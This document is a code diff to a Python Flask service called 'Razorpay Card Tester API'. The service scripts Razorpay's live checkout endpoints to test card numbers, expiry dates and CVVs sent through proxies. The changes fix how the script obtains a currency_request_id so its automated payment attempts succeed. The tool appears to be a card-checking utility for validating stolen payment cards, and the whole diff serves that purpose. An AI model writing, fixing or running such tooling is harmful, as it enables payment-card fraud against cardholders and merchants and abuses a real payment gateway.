@@ -1,9 +1,8 @@
-# app.py - Fixed currency_request_id generation
+# app.py - Fixed currency_request_id from cross-border response
 from flask import Flask, request, jsonify
 import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
 from urllib.parse import quote, urlparse, parse_qs, unquote
 import os
-import uuid
 
 urllib3.disable_warnings()
 
@@ -219,7 +218,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # STEP 5: Cross border flows
+        # STEP 5: Cross border flows - CAPTURE THE RESPONSE
         headers_cb = {
             "Accept": "*/*", 
             "Content-type": "application/json", 
@@ -237,14 +236,31 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             },
             "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
         }
-        session.post(
+        resp_cb = session.post(
             f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", 
             headers=headers_cb, 
             json=payload_cb, 
             timeout=30
         )
         
-        # STEP 6: Create payment - FIXED currency_request_id
+        # Extract currency_request_id from cross-border response
+        currency_request_id = None
+        try:
+            cb_data = resp_cb.json()
+            # Try multiple paths to find the ID
+            currency_request_id = (
+                cb_data.get('currency_request_id') or 
+                cb_data.get('data', {}).get('currency_request_id') or
+                cb_data.get('id') or
+                cb_data.get('request_id')
+            )
+            # If still None, generate a fallback
+            if not currency_request_id:
+                currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
+        except:
+            currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
+        
+        # STEP 6: Create payment - USE THE REAL currency_request_id
         headers_create = {
             'Accept': '*/*', 
             'Content-type': 'application/x-www-form-urlencoded', 
@@ -264,10 +280,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             separators=(',', ':')).encode()
         ).decode()
         
-        # Generate a unique currency_request_id - THIS IS THE FIX
-        # It needs to be a unique string, not just "INR"
-        currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
-        
         data_create = {
             "user_risk_providers_token": token_create, 
             'notes[comment]': '', 
@@ -279,9 +291,10 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'contact': PHONE, 
             'email': EMAIL, 
             'currency': 'INR',
-            # FIX: Use unique currency_request_id
+            # FIX: Use the actual currency_request_id from cross-border response
             'currency_request_id': currency_request_id,
             'dcc_currency': 'INR',
+            'dcc_currency_id': currency_request_id,  # Sometimes they expect this
             '_[integration]': 'payment_pages',
             '_[checkout_id]': checkout_id, 
             '_[device.id]': rzp_device_id, 
@@ -409,7 +422,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
 def home():
     return jsonify({
         "service": "Razorpay Card Tester API",
-        "version": "1.3",
+        "version": "1.4",
         "endpoints": {
             "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
         },
